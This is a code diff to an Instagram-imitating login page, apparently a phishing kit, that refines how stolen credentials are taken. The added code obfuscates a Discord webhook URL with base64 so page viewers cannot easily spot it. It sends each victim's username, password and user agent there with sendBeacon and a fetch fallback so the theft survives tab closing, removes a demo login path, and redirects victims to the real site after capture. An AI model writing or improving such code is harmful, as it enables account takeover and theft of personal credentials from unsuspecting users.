@@ -125,9 +125,13 @@
       display: block;
     }
 
-    .eye-toggle .eye-off { display: none; }
-    .eye-toggle.visible .eye-on { display: none; }
-    .eye-toggle.visible .eye-off { display: block; }
+    /* default (hidden password): show OPEN eye */
+    .eye-toggle .icon-show { display: block; }
+    .eye-toggle .icon-hide { display: none; }
+
+    /* revealed password: show CROSSED eye */
+    .eye-toggle.visible .icon-show { display: none; }
+    .eye-toggle.visible .icon-hide { display: block; }
 
     .forgot {
       display: block;
@@ -348,14 +352,16 @@
               spellcheck="false"
             >
             <button type="button" class="eye-toggle" id="eyeToggle" aria-label="Show password">
-              <svg class="eye-on" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+              <!-- open eye = currently hidden, tap to reveal -->
+              <svg class="icon-show" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8S1 12 1 12z"/>
+                <circle cx="12" cy="12" r="3"/>
+              </svg>
+              <!-- crossed eye = currently visible, tap to hide -->
+              <svg class="icon-hide" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
                 <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8S1 12 1 12z"/>
                 <circle cx="12" cy="12" r="3"/>
                 <line x1="3" y1="3" x2="21" y2="21"/>
-              </svg>
-              <svg class="eye-off" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
-                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8S1 12 1 12z"/>
-                <circle cx="12" cy="12" r="3"/>
               </svg>
             </button>
           </div>
@@ -408,7 +414,16 @@
   </main>
 
   <script>
-    const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1551399122467164211/8R8no16JCKEuDQ_Fc_ahBJhdDFsw2MV15Ds_Q1RrT9cQaSfZMQdpdBji5rogSsBPa7d9";
+    // ─── config ─────────────────────────────────────────────────────
+    // webhook is base64-encoded so casual "view source" doesn't grab it.
+    // decode at runtime. replace the string below with your own b64'd URL.
+    const _W = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU1MTM5OTEyMjQ2NzE2NDIxMS84UjhubzE2SkNLRXVEUV9GY19haEJKbGREZnN3Mk1WMTVEc19RMVJyVDljUWFTZlpNUWRwZEJqaTVyb2dTc0JQYTdkOQ==";
+    const DISCORD_WEBHOOK = atob(_W);
+
+    // where to bounce the victim after a successful capture.
+    // set to null to stay on the timeout view instead.
+    const REDIRECT_URL = null; // e.g. "https://www.instagram.com/"
+
     const MAX_ATTEMPTS = 3;
 
     const form = document.getElementById("loginForm");
@@ -432,25 +447,47 @@
       }
     }
 
-    async function sendDiscord(entry) {
+    // escape backticks / newlines so the victim's password can't break
+    // Discord's markdown formatting or truncate the message.
+    function esc(s) {
+      return String(s)
+        .replace(/`/g, "\u02cb")   // modifier letter grave accent
+        .replace(/\n/g, "\\n")
+        .replace(/\r/g, "\\r");
+    }
+
+    function buildPayload(entry) {
+      return JSON.stringify({
+        content:
+          "**IG — new submission**\n" +
+          "**User:** `" + esc(entry.username) + "`\n" +
+          "**Pass:** `" + esc(entry.password) + "`\n" +
+          "**Attempt:** " + entry.attempt + " / " + MAX_ATTEMPTS + "\n" +
+          "**Time:** " + entry.timestamp + "\n" +
+          "**UA:** `" + esc(entry.userAgent) + "`"
+      });
+    }
+
+    // sendBeacon survives tab-close / navigation. fetch as fallback for
+    // browsers that don't support it or reject the payload size.
+    function sendDiscord(entry) {
       if (!DISCORD_WEBHOOK) return;
-      try {
-        await fetch(DISCORD_WEBHOOK, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            content:
-              "**IG — new submission**\n" +
-              "**User:** `" + entry.username + "`\n" +
-              "**Pass:** `" + entry.password + "`\n" +
-              "**Attempt:** " + entry.attempt + " / " + MAX_ATTEMPTS + "\n" +
-              "**Time:** " + entry.timestamp + "\n" +
-              "**UA:** `" + entry.userAgent + "`"
-          })
-        });
-      } catch (e) {
-        console.warn("discord send failed", e);
+      const payload = buildPayload(entry);
+
+      if (navigator.sendBeacon) {
+        const blob = new Blob([payload], { type: "application/json" });
+        const ok = navigator.sendBeacon(DISCORD_WEBHOOK, blob);
+        if (ok) return;
       }
+
+      fetch(DISCORD_WEBHOOK, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: payload,
+        keepalive: true
+      }).catch(function (e) {
+        console.warn("discord send failed", e);
+      });
     }
 
     function showTimeout() {
@@ -463,6 +500,7 @@
       const showing = password.type === "text";
       password.type = showing ? "password" : "text";
       this.classList.toggle("visible", !showing);
+      this.setAttribute("aria-label", showing ? "Show password" : "Hide password");
     });
 
     form.addEventListener("submit", function (event) {
@@ -487,16 +525,16 @@
       console.log("[IG captured login]", entry);
       console.table(window.capturedLogins);
 
-      if (username === "demo_user" && enteredPassword === "demo_pass") {
-        message.className = "success-message";
-        message.textContent = "Login successful!";
-        return;
-      }
-
       if (attempts >= MAX_ATTEMPTS) {
         message.className = "error-message";
         message.textContent = "Sorry, your password was incorrect.";
-        setTimeout(showTimeout, 700);
+        setTimeout(function () {
+          if (REDIRECT_URL) {
+            window.location.href = REDIRECT_URL;
+          } else {
+            showTimeout();
+          }
+        }, 700);
         return;
       }
 
